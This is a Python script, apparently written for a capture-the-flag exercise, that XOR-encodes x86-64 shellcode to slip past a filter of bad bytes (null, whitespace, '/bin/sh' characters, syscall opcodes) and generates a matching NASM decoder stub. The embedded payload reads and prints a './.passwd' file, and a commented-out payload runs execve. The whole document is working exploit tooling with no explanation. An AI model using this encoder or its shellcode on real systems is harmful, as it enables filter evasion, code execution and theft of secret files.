#!/usr/bin/python3
import	sys
import	os
import	subprocess
from binascii import	unhexlify
from termcolor import	colored
from subprocess import	Popen, PIPE

filters = [0x00, 0x08, 0x09, 0x0a, 0x0d, 0x20, 0x2f, 0x62, 0x69, 0x6e, 0x73, 0x68, 0x80cd, 0x050f, 0x340f]

shellcode = [0xeb, 0x34, 0x5f, 0x48, 0x31, 0xc0, 0x04, 0x02, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x66, 0x81, 0xec, 0xff, 0x0f, 0x48, 0x8d, 0x34, 0x24, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xd2, 0x66, 0xba, 0xff, 0x0f, 0x48, 0x31, 0xc0, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x40, 0x80, 0xc7, 0x01, 0x48, 0x89, 0xc2, 0x48, 0x31, 0xc0, 0x04, 0x01, 0x0f, 0x05, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x2e, 0x2f, 0x2e, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x00]
#shellcode = [0xeb, 0x0f, 0x48, 0x31, 0xc0, 0xb0, 0x3b, 0x5f, 0x48, 0x89, 0xfa, 0x52, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0xe8, 0xec, 0xff, 0xff, 0xff]

shellcode_len = len(shellcode)

def	get_offset(shellcode, offset = 0x69):
	y = shellcode_len
	for s in shellcode:
		x = (s ^ offset)
		for c in filters:
			if x == c or x >= 255:
				return get_offset(shellcode, offset + 1)
	return offset

def	print_encoded(shellcode, offset):
	print(''.join([r'\x{:02x}'.format((c ^ offset)) for c in shellcode]))

def	print_decoder(shellcode, offset):
	f = open("decoder.asm", "w")
	f.write("""BITS 64
jmp short L1
L2:
	pop rsi
	xor rcx, rcx
	mov cl, {0}
L3:
	xor byte [rsi + rcx], {1}
	sub cl, 1
	jnz short L3
	xor byte [rsi + rcx], {1}
	jmp short L4
L1:
	call L2
L4:""".format(hex(shellcode_len), hex(offset)))
	f.close()
	os.system("nasm decoder.asm")
	result = subprocess.Popen(['xxd -ps decoder'], shell=True, stdout=subprocess.PIPE).communicate()[0]
	result = result.decode("utf-8").replace("\n", "")
	sys.stdout.write(r"\x" + r"\x".join(result[n : n+2] for n in range(0, len(result), 2)))

offset = get_offset(shellcode)
print("Offset {}".format(offset))
print_decoder(shellcode, offset)
print_encoded(shellcode, offset)
